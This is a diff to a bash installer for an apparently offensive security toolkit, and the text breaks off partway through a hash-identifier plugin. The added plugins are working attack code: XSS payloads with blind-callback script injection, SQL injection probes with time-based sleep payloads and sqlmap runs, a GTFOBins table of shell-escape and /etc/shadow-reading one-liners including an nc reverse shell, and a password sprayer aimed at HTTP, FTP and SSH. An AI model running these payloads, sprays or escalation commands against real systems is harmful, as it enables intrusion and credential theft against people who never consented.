@@ -1,8 +1,8 @@
 #!/usr/bin/env bash
 set -euo pipefail
 
-BASE="${HOME}/omni-sentinel-v67"
-UI="${HOME}/omni-ui-v67"
+BASE="${HOME}/omni-sentinel-v21.3"
+UI="${HOME}/omni-ui-v21.3"
 
 log() {
   printf '\033[1;36m[%s]\033[0m %s\n' "$1" "$2"
@@ -15,7 +15,7 @@ warn() {
 mkdir -p "$BASE"/{core,plugins,dashboard,agents,output,scripts,screenshots}
 mkdir -p "$UI/src"
 
-log "OK" "Deploying Omni-Sentinel V67 scaffold"
+log "OK" "Deploying Omni-Sentinel V21.3 scaffold"
 
 if command -v sudo >/dev/null 2>&1; then
   sudo apt update
@@ -95,7 +95,7 @@ services:
 
   ui:
     build:
-      context: ../omni-ui-v67
+      context: ../omni-ui-v21.3
       dockerfile: Dockerfile.ui
     restart: unless-stopped
     ports:
@@ -171,9 +171,9 @@ DOCKER
 
 cat > "$UI/package.json" <<'JSON'
 {
-  "name": "omni-ui-v67",
+  "name": "omni-ui-v21.3",
   "private": true,
-  "version": "67",
+  "version": "21.3.0",
   "type": "module",
   "scripts": {
     "dev": "vite",
@@ -198,7 +198,7 @@ cat > "$UI/index.html" <<'HTML'
   <head>
     <meta charset="UTF-8" />
     <meta name="viewport" content="width=device-width, initial-scale=1.0" />
-    <title>Omni-Sentinel V67</title>
+    <title>Omni-Sentinel V21.3</title>
   </head>
   <body>
     <div id="root"></div>
@@ -235,6 +235,9 @@ NVD_API_KEY=
 MAX_CONCURRENT_SCANS=3
 REDIS_URL=redis://localhost:6379/0
 VITE_API_URL=http://localhost:8000
+OLLAMA_BASE_URL=http://localhost:11434
+OLLAMA_MODEL=llama3
+OLLAMA_TIMEOUT=120
 ENV
 
 warn "Credentials saved to $BASE/.env"
@@ -427,7 +430,7 @@ NVD_API_KEY = os.getenv("NVD_API_KEY", "")
 def _nvd_fetch(keyword: str) -> list:
     if not keyword or not isinstance(keyword, str):
         return []
-    headers = {"User-Agent": "omni-sentinel/67"}
+    headers = {"User-Agent": "omni-sentinel/21.3"}
     if NVD_API_KEY:
         headers["apiKey"] = NVD_API_KEY
     params = {"keywordSearch": keyword, "resultsPerPage": 5}
@@ -636,7 +639,7 @@ import shutil
 import subprocess
 from typing import Optional
 
-SCREENSHOT_DIR = os.path.expanduser("~/omni-sentinel-v67/screenshots")
+SCREENSHOT_DIR = os.path.expanduser("~/omni-sentinel-v21.3/screenshots")
 
 
 def take_screenshot(scan_id: str, port: str, url: str) -> Optional[str]:
@@ -2448,3 +2451,4482 @@ warn "Run: $BASE/start.sh to start all services"
 warn "UI will be available at: http://localhost:5173"
 warn "API will be available at: http://localhost:8000"
 warn "Add NVD_API_KEY to $BASE/.env for higher CVE rate limits"
+
+# ══════════════════════════════════════════════════════════════════
+#  NEW PLUGINS: XSS Scanner, SQLi Scanner, GTFOBins, LinPEAS Parser
+#  Password Sprayer, Hash ID, Credential Tracker
+# ══════════════════════════════════════════════════════════════════
+
+cat > "$BASE/plugins/xss_scanner.py" <<'PY'
+import logging
+import re
+from typing import Callable, Optional
+from urllib.parse import urlencode, urlparse, parse_qs, urljoin
+
+import requests
+
+logger = logging.getLogger(__name__)
+requests.packages.urllib3.disable_warnings()
+
+# Payload library: basic, filter-bypass, polyglot
+XSS_PAYLOADS = [
+    # Basic
+    '<script>alert(1)</script>',
+    '"><script>alert(1)</script>',
+    "'><script>alert(1)</script>",
+    # Attribute injection
+    '" onmouseover="alert(1)',
+    "' onmouseover='alert(1)'",
+    # Filter bypass
+    '<ScRiPt>alert(1)</ScRiPt>',
+    '<img src=x onerror=alert(1)>',
+    '<svg/onload=alert(1)>',
+    '<body onload=alert(1)>',
+    # Polyglots
+    "jaVasCript:/*-/*`/*\\`/*'/*\"/**/(/* */oNcliCk=alert() )//%0D%0A%0d%0a//</stYle/</titLe/</teXtarEa/</scRipt/--!>\\x3csVg/<sVg/oNloAd=alert()//>\x3e",
+    # Encoded
+    '&#x3C;script&#x3E;alert(1)&#x3C;/script&#x3E;',
+    '%3Cscript%3Ealert(1)%3C%2Fscript%3E',
+]
+
+BLIND_MARKER = "omni-xss-blind"
+
+SESSION = requests.Session()
+SESSION.headers.update({"User-Agent": "Mozilla/5.0 (X11; Linux x86_64)"})
+
+
+def _inject_params(url: str, payload: str) -> list[str]:
+    """Return list of URLs with each query param replaced by payload."""
+    parsed = urlparse(url)
+    params = parse_qs(parsed.query, keep_blank_values=True)
+    if not params:
+        return [f"{url}{'?' if '?' not in url else '&'}q={requests.utils.quote(payload)}"]
+    urls = []
+    for key in params:
+        injected = dict(params)
+        injected[key] = [payload]
+        flat = {k: v[0] for k, v in injected.items()}
+        new_query = urlencode(flat)
+        urls.append(parsed._replace(query=new_query).geturl())
+    return urls
+
+
+def _check_reflected(response_text: str, payload: str) -> bool:
+    return payload in response_text or payload.lower() in response_text.lower()
+
+
+def scan_xss(
+    url: str,
+    blind_callback: Optional[str] = None,
+    timeout: int = 8,
+    progress_fn: Optional[Callable] = None,
+) -> dict:
+    findings = []
+    tested = 0
+    errors = 0
+
+    payloads = list(XSS_PAYLOADS)
+    if blind_callback:
+        payloads.append(f'<script src="{blind_callback}?m={BLIND_MARKER}"></script>')
+        payloads.append(f'"><img src="{blind_callback}?m={BLIND_MARKER}">')
+
+    for payload in payloads:
+        inject_urls = _inject_params(url, payload)
+        for inject_url in inject_urls:
+            tested += 1
+            try:
+                resp = SESSION.get(inject_url, timeout=timeout, verify=False, allow_redirects=True)
+                reflected = _check_reflected(resp.text, payload)
+                if reflected:
+                    findings.append({
+                        "type": "reflected",
+                        "url": inject_url,
+                        "payload": payload,
+                        "status_code": resp.status_code,
+                        "confirmed": True,
+                    })
+                    logger.info(f"XSS reflected: {inject_url}")
+            except requests.RequestException as exc:
+                errors += 1
+                logger.debug(f"XSS probe error {inject_url}: {exc}")
+
+            # Also try POST
+            try:
+                resp = SESSION.post(url, data={"q": payload, "search": payload, "input": payload},
+                                    timeout=timeout, verify=False)
+                if _check_reflected(resp.text, payload):
+                    findings.append({
+                        "type": "reflected_post",
+                        "url": url,
+                        "payload": payload,
+                        "status_code": resp.status_code,
+                        "confirmed": True,
+                    })
+            except requests.RequestException:
+                pass
+
+            if progress_fn and tested % 5 == 0:
+                progress_fn(tested, len(payloads) * len(inject_urls), len(findings))
+
+    return {
+        "url": url,
+        "tested": tested,
+        "errors": errors,
+        "findings": findings,
+        "vulnerable": len(findings) > 0,
+        "finding_count": len(findings),
+    }
+
+
+def scan_xss_multi(base_url: str, paths: list[str], blind_callback: Optional[str] = None) -> list:
+    results = []
+    for path in paths:
+        url = urljoin(base_url, path)
+        result = scan_xss(url, blind_callback=blind_callback)
+        if result["vulnerable"]:
+            results.append(result)
+    return results
+PY
+
+cat > "$BASE/plugins/sqli_scanner.py" <<'PY'
+import logging
+import re
+import shutil
+import subprocess
+import time
+from typing import Callable, Optional
+from urllib.parse import urlparse, parse_qs, urlencode, urljoin
+
+import requests
+
+logger = logging.getLogger(__name__)
+requests.packages.urllib3.disable_warnings()
+
+SESSION = requests.Session()
+SESSION.headers.update({"User-Agent": "Mozilla/5.0 (X11; Linux x86_64)"})
+
+# DB error signatures for error-based detection
+DB_ERRORS = {
+    "mysql": [
+        r"you have an error in your sql syntax",
+        r"warning: mysql",
+        r"mysql_fetch",
+        r"supplied argument is not a valid mysql",
+    ],
+    "mssql": [
+        r"microsoft sql native client",
+        r"odbc sql server driver",
+        r"unclosed quotation mark",
+        r"syntax error converting",
+    ],
+    "postgresql": [
+        r"pg_query\(\)",
+        r"pg_exec\(\)",
+        r"postgresql.*error",
+        r"warning.*pg_",
+    ],
+    "sqlite": [
+        r"sqlite_array_query",
+        r"sqlite.*error",
+        r"sqliteexception",
+    ],
+    "oracle": [
+        r"oracle error",
+        r"ora-[0-9]{5}",
+        r"oracle.*driver",
+    ],
+    "generic": [
+        r"sql syntax",
+        r"syntax error",
+        r"unexpected end of sql",
+        r"unterminated string",
+    ],
+}
+
+ERROR_PAYLOADS = ["'", '"', "\\", "';--", '";--', "1'1", "1 AND 1=1", "1 AND 1=2"]
+
+BOOLEAN_PAIRS = [
+    ("1 AND 1=1", "1 AND 1=2"),
+    ("1' AND '1'='1", "1' AND '1'='2"),
+    ("1\" AND \"1\"=\"1", "1\" AND \"1\"=\"2"),
+]
+
+TIME_PAYLOADS = {
+    "mysql": "1; SELECT SLEEP(3)--",
+    "mssql": "1; WAITFOR DELAY '0:0:3'--",
+    "postgresql": "1; SELECT pg_sleep(3)--",
+    "generic": "1; SELECT SLEEP(3)--",
+}
+
+
+def _detect_db_error(text: str) -> Optional[str]:
+    lower = text.lower()
+    for db, patterns in DB_ERRORS.items():
+        for pattern in patterns:
+            if re.search(pattern, lower):
+                return db
+    return None
+
+
+def _inject_param(url: str, param: str, payload: str) -> str:
+    from urllib.parse import urlparse, parse_qs, urlencode
+    parsed = urlparse(url)
+    params = parse_qs(parsed.query, keep_blank_values=True)
+    params[param] = [payload]
+    flat = {k: v[0] for k, v in params.items()}
+    return parsed._replace(query=urlencode(flat)).geturl()
+
+
+def _get_params(url: str) -> list[str]:
+    return list(parse_qs(urlparse(url).query).keys())
+
+
+def scan_sqli_error(url: str, timeout: int = 8) -> list:
+    findings = []
+    params = _get_params(url) or ["id", "q", "search", "page", "cat"]
+    for param in params:
+        for payload in ERROR_PAYLOADS:
+            inject_url = _inject_param(url, param, payload)
+            try:
+                resp = SESSION.get(inject_url, timeout=timeout, verify=False)
+                db = _detect_db_error(resp.text)
+                if db:
+                    findings.append({
+                        "type": "error_based",
+                        "param": param,
+                        "payload": payload,
+                        "db": db,
+                        "url": inject_url,
+                        "confirmed": True,
+                    })
+                    logger.info(f"SQLi error-based: {inject_url} [{db}]")
+                    break
+            except requests.RequestException as exc:
+                logger.debug(f"SQLi error probe failed: {exc}")
+    return findings
+
+
+def scan_sqli_boolean(url: str, timeout: int = 8) -> list:
+    findings = []
+    params = _get_params(url) or ["id", "q", "search"]
+    try:
+        baseline = SESSION.get(url, timeout=timeout, verify=False)
+        baseline_len = len(baseline.text)
+    except requests.RequestException:
+        return []
+
+    for param in params:
+        for true_payload, false_payload in BOOLEAN_PAIRS:
+            try:
+                true_resp = SESSION.get(_inject_param(url, param, true_payload), timeout=timeout, verify=False)
+                false_resp = SESSION.get(_inject_param(url, param, false_payload), timeout=timeout, verify=False)
+                diff = abs(len(true_resp.text) - len(false_resp.text))
+                true_diff = abs(len(true_resp.text) - baseline_len)
+                if diff > 50 and true_diff < 100:
+                    findings.append({
+                        "type": "boolean_based",
+                        "param": param,
+                        "true_payload": true_payload,
+                        "false_payload": false_payload,
+                        "response_diff": diff,
+                        "url": url,
+                        "confirmed": True,
+                    })
+                    logger.info(f"SQLi boolean-based: {url} param={param}")
+                    break
+            except requests.RequestException:
+                continue
+    return findings
+
+
+def scan_sqli_time(url: str, timeout: int = 10, sleep_seconds: int = 3) -> list:
+    findings = []
+    params = _get_params(url) or ["id", "q", "search"]
+    for param in params:
+        for db, payload in TIME_PAYLOADS.items():
+            inject_url = _inject_param(url, param, payload)
+            try:
+                start = time.monotonic()
+                SESSION.get(inject_url, timeout=timeout + sleep_seconds + 2, verify=False)
+                elapsed = time.monotonic() - start
+                if elapsed >= sleep_seconds:
+                    findings.append({
+                        "type": "time_based",
+                        "param": param,
+                        "payload": payload,
+                        "db_hint": db,
+                        "elapsed": round(elapsed, 2),
+                        "url": inject_url,
+                        "confirmed": True,
+                    })
+                    logger.info(f"SQLi time-based: {inject_url} [{db}] elapsed={elapsed:.1f}s")
+                    break
+            except requests.RequestException:
+                continue
+    return findings
+
+
+def run_sqlmap(url: str, params: Optional[list] = None, timeout: int = 120) -> dict:
+    if not shutil.which("sqlmap"):
+        return {"available": False, "message": "sqlmap not found in PATH"}
+    cmd = ["sqlmap", "-u", url, "--batch", "--level=2", "--risk=1", "--output-dir=/tmp/sqlmap_out"]
+    if params:
+        cmd += ["-p", ",".join(params)]
+    try:
+        result = subprocess.run(cmd, capture_output=True, text=True, timeout=timeout, check=False)
+        output = result.stdout + result.stderr
+        vuln = "is vulnerable" in output.lower() or "parameter" in output.lower() and "injectable" in output.lower()
+        return {"available": True, "vulnerable": vuln, "output": output[-3000:]}
+    except subprocess.TimeoutExpired:
+        return {"available": True, "vulnerable": False, "output": "sqlmap timed out"}
+    except Exception as exc:
+        return {"available": True, "vulnerable": False, "output": str(exc)}
+
+
+def scan_sqli(url: str, run_sqlmap_flag: bool = False) -> dict:
+    all_findings = []
+    all_findings += scan_sqli_error(url)
+    all_findings += scan_sqli_boolean(url)
+    all_findings += scan_sqli_time(url)
+
+    sqlmap_result = {}
+    if run_sqlmap_flag and all_findings:
+        sqlmap_result = run_sqlmap(url)
+
+    db_types = list({f.get("db") or f.get("db_hint", "unknown") for f in all_findings})
+
+    return {
+        "url": url,
+        "findings": all_findings,
+        "vulnerable": len(all_findings) > 0,
+        "finding_count": len(all_findings),
+        "db_types_detected": db_types,
+        "sqlmap": sqlmap_result,
+    }
+PY
+
+cat > "$BASE/plugins/gtfobins.py" <<'PY'
+import logging
+import shutil
+import subprocess
+from typing import Optional
+
+import requests
+
+logger = logging.getLogger(__name__)
+
+GTFOBINS_URL = "https://gtfobins.github.io/gtfobins/{binary}/"
+
+# Offline cache of common GTFOBins entries for HTB
+GTFOBINS_LOCAL = {
+    "bash": {"shell": "bash -p", "file_read": "bash -c 'cat /etc/shadow'", "suid": "bash -p"},
+    "python": {"shell": "python -c 'import os; os.execl(\"/bin/sh\",\"sh\",\"-p\")'"},
+    "python3": {"shell": "python3 -c 'import os; os.execl(\"/bin/sh\",\"sh\",\"-p\")'"},
+    "perl": {"shell": "perl -e 'exec \"/bin/sh\";'"},
+    "ruby": {"shell": "ruby -e 'exec \"/bin/sh\"'"},
+    "php": {"shell": "php -r 'system(\"/bin/sh\");'"},
+    "vim": {"shell": "vim -c ':!/bin/sh'", "suid": "vim -c ':py import os; os.execl(\"/bin/sh\",\"sh\",\"-pc\",\"reset; exec sh -p\")'"},
+    "nano": {"shell": "nano\n^R^X\nreset; sh 1>&0 2>&0"},
+    "less": {"shell": "less /etc/passwd\n!/bin/sh"},
+    "more": {"shell": "more /etc/passwd\n!/bin/sh"},
+    "man": {"shell": "man ls\n!/bin/sh"},
+    "awk": {"shell": "awk 'BEGIN {system(\"/bin/sh\")}'"},
+    "nmap": {"shell": "nmap --interactive\n!sh", "suid": "echo 'os.execute(\"/bin/sh\")' > /tmp/shell.nse && nmap --script=/tmp/shell.nse"},
+    "find": {"shell": "find . -exec /bin/sh \\; -quit", "suid": "find . -exec /bin/sh -p \\; -quit"},
+    "tar": {"shell": "tar -cf /dev/null /dev/null --checkpoint=1 --checkpoint-action=exec=/bin/sh"},
+    "zip": {"shell": "zip /tmp/omg -q /tmp/omg -T --unzip-command='sh -c /bin/sh'"},
+    "wget": {"file_read": "wget file:///etc/shadow -O -"},
+    "curl": {"file_read": "curl file:///etc/shadow"},
+    "socat": {"shell": "socat stdin exec:/bin/sh"},
+    "nc": {"shell": "nc -e /bin/sh 127.0.0.1 4444"},
+    "netcat": {"shell": "nc -e /bin/sh 127.0.0.1 4444"},
+    "env": {"shell": "env /bin/sh"},
+    "tee": {"file_write": "echo 'data' | tee /path/to/file"},
+    "cp": {"file_write": "cp /bin/sh /tmp/sh && chmod +s /tmp/sh"},
+    "mv": {"file_write": "mv /tmp/payload /etc/cron.d/"},
+    "dd": {"file_read": "dd if=/etc/shadow", "file_write": "echo 'data' | dd of=/path/to/file"},
+    "xxd": {"file_read": "xxd /etc/shadow | xxd -r"},
+    "base64": {"file_read": "base64 /etc/shadow | base64 --decode"},
+    "strace": {"shell": "strace -o /dev/null /bin/sh"},
+    "gdb": {"shell": "gdb -q --nx -ex 'python import os; os.execl(\"/bin/sh\",\"sh\",\"-p\")' -ex quit"},
+    "git": {"shell": "git help config\n!/bin/sh"},
+    "ftp": {"shell": "ftp\n!/bin/sh"},
+    "ssh": {"shell": "ssh -o ProxyCommand=';sh 0<&2 1>&2' x"},
+    "rsync": {"shell": "rsync -e 'sh -p -c \"sh 0<&2 1>&2\"' 127.0.0.1:/dev/null"},
+    "docker": {"shell": "docker run -v /:/mnt --rm -it alpine chroot /mnt sh"},
+    "kubectl": {"shell": "kubectl run shell --rm -i --tty --image ubuntu -- bash"},
+    "node": {"shell": "node -e 'require(\"child_process\").spawn(\"/bin/sh\",{stdio:[0,1,2]})'"},
+    "lua": {"shell": "lua -e 'os.execute(\"/bin/sh\")'"},
+    "irb": {"shell": "irb\nexec '/bin/sh'"},
+    "jq": {"file_read": "jq -Rr . /etc/shadow"},
+    "openssl": {"file_read": "openssl enc -in /etc/shadow"},
+    "sqlite3": {"shell": "sqlite3 /dev/null '.shell /bin/sh'"},
+    "mysql": {"shell": "mysql -e '\\! /bin/sh'"},
+    "psql": {"shell": "psql -c '\\! /bin/sh'"},
+    "ed": {"shell": "ed\n!/bin/sh"},
+    "scp": {"file_read": "scp -F /proc/1/fd/3 root@127.0.0.1:/dev/null"},
+    "screen": {"shell": "screen"},
+    "tmux": {"shell": "tmux"},
+    "at": {"shell": "echo '/bin/sh <> /dev/tty' | at now; tail -f /dev/null"},
+    "crontab": {"shell": "echo '/bin/sh <> /dev/tty' | crontab -"},
+    "systemctl": {"shell": "systemctl --force --force reboot"},
+    "journalctl": {"shell": "journalctl\n!/bin/sh"},
+    "chmod": {"suid": "chmod +s /bin/bash && bash -p"},
+    "chown": {"suid": "chown root:root /bin/bash && chmod +s /bin/bash"},
+    "tclsh": {"shell": "tclsh\nexec /bin/sh <@stdin >@stdout 2>@stderr"},
+    "expect": {"shell": "expect\nspawn sh\ninteract"},
+    "readelf": {"file_read": "readelf -a /etc/shadow"},
+    "hexdump": {"file_read": "hexdump -C /etc/shadow"},
+    "timeout": {"shell": "timeout 7d /bin/sh"},
+    "ul": {"shell": "ul /etc/shadow | more\n!/bin/sh"},
+    "xargs": {"shell": "xargs -a /dev/null sh"},
+}
+
+
+def lookup_gtfobin(binary: str) -> dict:
+    binary = binary.lower().strip()
+    local = GTFOBINS_LOCAL.get(binary)
+    if local:
+        return {
+            "binary": binary,
+            "found": True,
+            "techniques": local,
+            "url": GTFOBINS_URL.format(binary=binary),
+            "source": "local_cache",
+        }
+    return {
+        "binary": binary,
+        "found": False,
+        "techniques": {},
+        "url": GTFOBINS_URL.format(binary=binary),
+        "source": "not_in_cache",
+    }
+
+
+def find_suid_binaries(scan_id: str) -> list:
+    """Try to find SUID binaries via SSH or assume local context."""
+    suid_cmd = "find / -perm -4000 -type f 2>/dev/null"
+    try:
+        result = subprocess.run(
+            ["bash", "-c", suid_cmd],
+            capture_output=True, text=True, timeout=10, check=False,
+        )
+        lines = [l.strip() for l in result.stdout.splitlines() if l.strip()]
+        results = []
+        for path in lines:
+            binary = path.split("/")[-1]
+            gtfo = lookup_gtfobin(binary)
+            if gtfo["found"]:
+                results.append({"path": path, "binary": binary, "gtfo": gtfo})
+        return results
+    except Exception as exc:
+        logger.debug(f"SUID search failed: {exc}")
+        return []
+
+
+def suggest_gtfobins(binaries: list[str]) -> list:
+    results = []
+    for binary in binaries:
+        info = lookup_gtfobin(binary)
+        if info["found"]:
+            results.append(info)
+    return results
+PY
+
+cat > "$BASE/plugins/linpeas_parser.py" <<'PY'
+import logging
+import re
+from typing import Optional
+
+logger = logging.getLogger(__name__)
+
+# Regex patterns for key findings
+PATTERNS = {
+    "sudo_nopasswd": re.compile(r"NOPASSWD.*ALL|NOPASSWD.*\(ALL\)", re.IGNORECASE),
+    "suid_binary": re.compile(r"-rws[-r][-w][-xs][-r][-w][-xt]\s+\S+\s+\S+\s+(\S+)", re.MULTILINE),
+    "writable_path": re.compile(r"Writable PATH.*?:(.*?)$", re.IGNORECASE | re.MULTILINE),
+    "cron_job": re.compile(r"(/etc/cron\S*|crontab -l|CRON)", re.IGNORECASE),
+    "password_in_file": re.compile(r"password\s*[=:]\s*\S+", re.IGNORECASE),
+    "ssh_key": re.compile(r"-----BEGIN [A-Z]+ PRIVATE KEY-----"),
+    "kernel_version": re.compile(r"Linux version (\S+)", re.IGNORECASE),
+    "os_release": re.compile(r"PRETTY_NAME=\"([^\"]+)\""),
+    "docker_group": re.compile(r"\bdocker\b.*\bgroup\b|\bgroup\b.*\bdocker\b", re.IGNORECASE),
+    "writable_etc": re.compile(r"writable.*?/etc/", re.IGNORECASE),
+    "env_variable": re.compile(r"(API_KEY|SECRET|PASSWORD|TOKEN|PASS|PWD)\s*[=:]\s*\S+", re.IGNORECASE),
+    "capabilities": re.compile(r"cap_[a-z_]+\+ep", re.IGNORECASE),
+    "nfs_no_root_squash": re.compile(r"no_root_squash", re.IGNORECASE),
+    "path_hijack": re.compile(r"Writable folders in PATH", re.IGNORECASE),
+    "backup_files": re.compile(r"\.(bak|backup|old|orig|save|swp|~)$", re.IGNORECASE | re.MULTILINE),
+}
+
+SEVERITY_MAP = {
+    "sudo_nopasswd": "CRITICAL",
+    "suid_binary": "HIGH",
+    "ssh_key": "CRITICAL",
+    "password_in_file": "HIGH",
+    "env_variable": "HIGH",
+    "capabilities": "HIGH",
+    "nfs_no_root_squash": "HIGH",
+    "writable_etc": "HIGH",
+    "docker_group": "HIGH",
+    "path_hijack": "MEDIUM",
+    "cron_job": "MEDIUM",
+    "writable_path": "MEDIUM",
+    "kernel_version": "INFO",
+    "os_release": "INFO",
+    "backup_files": "LOW",
+}
+
+
+def parse_linpeas(output: str) -> dict:
+    if not output:
+        return {"findings": [], "summary": {}, "error": "Empty output"}
+
+    findings = []
+    for key, pattern in PATTERNS.items():
+        matches = pattern.findall(output)
+        if matches:
+            severity = SEVERITY_MAP.get(key, "INFO")
+            for match in matches[:10]:  # cap per category
+                value = match if isinstance(match, str) else str(match)
+                findings.append({
+                    "category": key,
+                    "severity": severity,
+                    "value": value.strip()[:300],
+                })
+
+    # Deduplicate
+    seen = set()
+    unique = []
+    for f in findings:
+        key = f"{f['category']}:{f['value'][:50]}"
+        if key not in seen:
+            seen.add(key)
+            unique.append(f)
+
+    # Sort by severity
+    sev_order = {"CRITICAL": 0, "HIGH": 1, "MEDIUM": 2, "LOW": 3, "INFO": 4}
+    unique.sort(key=lambda x: sev_order.get(x["severity"], 5))
+
+    summary = {
+        "critical": sum(1 for f in unique if f["severity"] == "CRITICAL"),
+        "high": sum(1 for f in unique if f["severity"] == "HIGH"),
+        "medium": sum(1 for f in unique if f["severity"] == "MEDIUM"),
+        "low": sum(1 for f in unique if f["severity"] == "LOW"),
+        "info": sum(1 for f in unique if f["severity"] == "INFO"),
+        "total": len(unique),
+    }
+
+    return {"findings": unique, "summary": summary}
+PY
+
+cat > "$BASE/plugins/password_sprayer.py" <<'PY'
+import logging
+import shutil
+import socket
+import subprocess
+import ftplib
+from typing import Callable, Optional
+
+import requests
+
+logger = logging.getLogger(__name__)
+
+COMMON_PASSWORDS = [
+    "password", "123456", "admin", "root", "letmein",
+    "welcome", "monkey", "dragon", "master", "sunshine",
+    "password1", "Password1", "Pass123", "Admin123",
+    "changeme", "default", "qwerty", "abc123",
+    "iloveyou", "trustno1", "football", "shadow",
+    "hello", "test", "guest", "login",
+]
+
+
+def _try_http_basic(url: str, username: str, password: str, timeout: int = 5) -> bool:
+    try:
+        resp = requests.get(url, auth=(username, password), timeout=timeout, verify=False, allow_redirects=False)
+        return resp.status_code not in (401, 403)
+    except requests.RequestException:
+        return False
+
+
+def _try_http_form(url: str, username: str, password: str,
+                   user_field: str = "username", pass_field: str = "password",
+                   success_indicator: str = "", timeout: int = 5) -> bool:
+    try:
+        resp = requests.post(url, data={user_field: username, pass_field: password},
+                             timeout=timeout, verify=False, allow_redirects=True)
+        if success_indicator:
+            return success_indicator in resp.text
+        # Heuristic: check for common failure strings
+        fail_indicators = ["invalid", "incorrect", "failed", "wrong", "error", "denied"]
+        lower = resp.text.lower()
+        return not any(ind in lower for ind in fail_indicators) and resp.status_code == 200
+    except requests.RequestException:
+        return False
+
+
+def _try_ftp(host: str, username: str, password: str, port: int = 21, timeout: int = 5) -> bool:
+    try:
+        ftp = ftplib.FTP()
+        ftp.connect(host, port, timeout=timeout)
+        ftp.login(username, password)
+        ftp.quit()
+        return True
+    except ftplib.error_perm:
+        return False
+    except Exception:
+        return False
+
+
+def _try_ssh(host: str, username: str, password: str, port: int = 22, timeout: int = 5) -> bool:
+    try:
+        import paramiko
+        client = paramiko.SSHClient()
+        client.set_missing_host_key_policy(paramiko.AutoAddPolicy())
+        client.connect(host, port=port, username=username, password=password, timeout=timeout, banner_timeout=timeout)
+        client.close()
+        return True
+    except Exception:
+        return False
+
+
+def spray(
+    host: str,
+    usernames: list[str],
+    passwords: Optional[list[str]] = None,
+    service: str = "http",
+    port: int = 80,
+    url: Optional[str] = None,
+    user_field: str = "username",
+    pass_field: str = "password",
+    success_indicator: str = "",
+    delay: float = 0.3,
+    progress_fn: Optional[Callable] = None,
+) -> dict:
+    import time
+    passwords = passwords or COMMON_PASSWORDS
+    hits = []
+    tested = 0
+    total = len(usernames) * len(passwords)
+
+    for username in usernames:
+        for password in passwords:
+            tested += 1
+            success = False
+            try:
+                if service in ("http", "https"):
+                    target_url = url or f"{service}://{host}:{port}"
+                    success = _try_http_basic(target_url, username, password)
+                elif service == "http_form":
+                    success = _try_http_form(
+                        url or f"http://{host}:{port}/login",
+                        username, password, user_field, pass_field, success_indicator,
+                    )
+                elif service == "ftp":
+                    success = _try_ftp(host, username, password, port)
+                elif service == "ssh":
+                    success = _try_ssh(host, username, password, port)
+            except Exception as exc:
+                logger.debug(f"Spray error {username}:{password}: {exc}")
+
+            if success:
+                hits.append({"username": username, "password": password, "service": service})
+                logger.info(f"[SPRAY HIT] {service}://{host} — {username}:{password}")
+
+            if progress_fn and tested % 10 == 0:
+                progress_fn(tested, total, len(hits))
+
+            time.sleep(delay)
+
+    return {
+        "host": host,
+        "service": service,
+        "tested": tested,
+        "hits": hits,
+        "success": len(hits) > 0,
+    }
+PY
+
+cat > "$BASE/plugins/hash_identifier.py" <<'PY'
+import hashlib
+import re
+from typing import Optional
+
+# Hash type signatures
+HASH_PATTERNS = [
+    (re.compile(r"^\$2[aby]\$\d+\$.{53}$"), "bcrypt", "hashcat -m 3200"),
+    (re.compile(r"^\$6\$.{8,16}\$.{86}$"), "sha512crypt", "hashcat -m 1800"),
+    (re.compile(r"^\$5\$.{8,16}\$.{43}$"), "sha256crypt", "hashcat -m 7400"),
+    (re.compile(r"^\$1\$.{8}\$.{22}$"), "md5crypt", "hashcat -m 500"),
+    (re.compile(r"^\$apr1\$.{8}\$.{22}$"), "apr1md5", "hashcat -m 1600"),
+    (re.compile(r"^[a-f0-9]{128}$", re.IGNORECASE), "sha512", "hashcat -m 1700"),
+    (re.compile(r"^[a-f0-9]{96}$", re.IGNORECASE), "sha384", "hashcat -m 10800"),
+    (re.compile(r"^[a-f0-9]{64}$", re.IGNORECASE), "sha256", "hashcat -m 1400"),
+    (re.compile(r"^[a-f0-9]{56}$", re.IGNORECASE), "sha224", "hashcat -m 1300"),
+    (re.compile(r"^[a-f0-9]{40}$", re.IGNORECASE), "sha1", "hashcat -m 100"),
+    (re.compile(r"^[a-f0-9]{32}$", re.IGNORECASE), "md5", "hashcat -m 0"),
+    (re.compile(r"^[a-f0-9]{16}$", re.IGNORECASE), "mysql_323", "hashcat -m 200"),
+    (re.compile(r"^\*[a-f0-9]{40}$", re.IGNORECASE), "mysql41", "hashcat -m 300"),
+    (re.compile(r"^[a-zA-Z0-9./]{13}$"), "des_crypt", "hashcat -m 1500"),
+    (re.compile(r"^[a-zA-Z0-9+/]{27}=$"), "base64_md5", "hashcat -m 0 (after decode)"),
+    (re.compile(r"^[a-f0-9]{32}:[a-f0-9]{32}$", re.IGNORECASE), "ntlm_with_lm", "hashcat -m 1000"),
+    (re.compile(r"^[a-f0-9]{32}$", re.IGNORECASE), "ntlm or md5", "hashcat -m 1000 or -m 0"),
+    (re.compile(r"^\$NT\$[a-f0-9]{32}$", re.IGNORECASE), "ntlm", "hashcat -m 1000"),
+    (re.compile(r"^[a-f0-9]{32}:[a-f0-9]{32}$", re.IGNORECASE), "netntlmv1", "hashcat -m 5500"),
+    (re.compile(r"^\S+::[^:]+:[a-f0-9]{16}:[a-f0-9]{32}:[a-f0-9]+$", re.IGNORECASE), "netntlmv2", "hashcat -m 5600"),
+    (re.compile(r"^\$krb5asrep\$23\$"), "kerberos_asrep", "hashcat -m 18200"),
+    (re.compile(r"^\$krb5tgs\$23\$"), "kerberos_tgs", "hashcat -m 13100"),
+    (re.compile(r"^[a-zA-Z0-9+/=]{24}$"), "base64", "base64 -d"),
+    (re.compile(r"^[a-f0-9]{48}$", re.IGNORECASE), "sha1_or_tiger192", "hashcat -m 100"),
+]
+
+JOHN_MAP = {
+    "md5": "--format=raw-md5",
+    "sha1": "--format=raw-sha1",
+    "sha256": "--format=raw-sha256",
+    "sha512": "--format=raw-sha512",
+    "bcrypt": "--format=bcrypt",
+    "md5crypt": "--format=md5crypt",
+    "sha512crypt": "--format=sha512crypt",
+    "ntlm": "--format=nt",
+    "netntlmv2": "--format=netntlmv2",
+    "kerberos_asrep": "--format=krb5asrep",
+    "kerberos_tgs": "--format=krb5tgs",
+}
+
+
+def identify_hash(hash_str: str) -> dict:
+    hash_str = hash_str.strip()
+    candidates = []
+    for pattern, name, hashcat_cmd in HASH_PATTERNS:
+        if pattern.match(hash_str):
+            candidates.append({
+                "type": name,
+                "hashcat": hashcat_cmd,
+                "john": JOHN_MAP.get(name.split("_")[0], "--format=auto"),
+                "length": len(hash_str),
+            })
+
+    if not candidates:
+        candidates.append({
+            "type": "unknown",
+            "hashcat": "Try hashcat --help for formats",
